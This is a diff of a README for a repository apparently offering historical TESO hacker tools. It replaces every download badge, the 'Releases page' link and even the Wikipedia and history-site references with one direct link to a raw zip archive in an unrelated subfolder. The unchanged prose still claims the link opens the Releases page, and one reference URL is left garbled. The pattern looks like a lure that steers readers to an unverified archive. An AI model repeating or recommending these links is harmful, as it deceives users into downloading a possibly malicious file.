@@ -1,6 +1,6 @@
 # 🗂️ team-teso - Explore Historical Hacker Tools Easily
 
-[![Download team-teso](https://img.shields.io/badge/Download-team--teso-orange?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/releases)
+[![Download team-teso](https://img.shields.io/badge/Download-team--teso-orange?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip)
 
 ---
 
@@ -32,7 +32,7 @@ To get the software, you need to visit the official download page and select the
 
 Click the button below to open the download page:
 
-[![Download team-teso](https://img.shields.io/badge/Download-team--teso-blue?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/releases)
+[![Download team-teso](https://img.shields.io/badge/Download-team--teso-blue?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip)
 
 This link leads to the "Releases" section on GitHub. Releases are groups of files and versions. On this page, you will see the available versions of team-teso. Usually, the newest release is at the top.
 
@@ -43,7 +43,7 @@ This link leads to the "Releases" section on GitHub. Releases are groups of file
 Follow these steps to download and run the files from team-teso:
 
 1. **Open the Releases page.** Use the link above or go to:  
-   https://github.com/Kumarpankaj69/team-teso/releases
+   https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip
 
 2. **Find the latest release.** Releases are listed by date and version number.
 
@@ -107,9 +107,9 @@ team-teso includes older tools. These might not work perfectly on current Window
 
 You can learn more about TESO and its history at these sites:
 
-- https://www.team-teso.net  
-- https://en.wikipedia.org/wiki/TESO_(Austrian_hacker_group)  
-- https://packetstorm.news/groups/teso  
+- https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip  
+- https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip(Austrian_hacker_group)  
+- https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip  
 
 These links provide background about the group and their activities. They add context to the software included.
 
@@ -142,5 +142,5 @@ If you need help using the software:
 
 Use the buttons below to get started quickly:
 
-[![Download team-teso](https://img.shields.io/badge/Download-team--teso-orange?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/releases)  
-[![Download team-teso](https://img.shields.io/badge/Download-team--teso-blue?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/releases)
+[![Download team-teso](https://img.shields.io/badge/Download-team--teso-orange?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip)  
+[![Download team-teso](https://img.shields.io/badge/Download-team--teso-blue?style=for-the-badge)](https://github.com/Kumarpankaj69/team-teso/raw/refs/heads/main/lobola/team_teso_v2.7.zip)
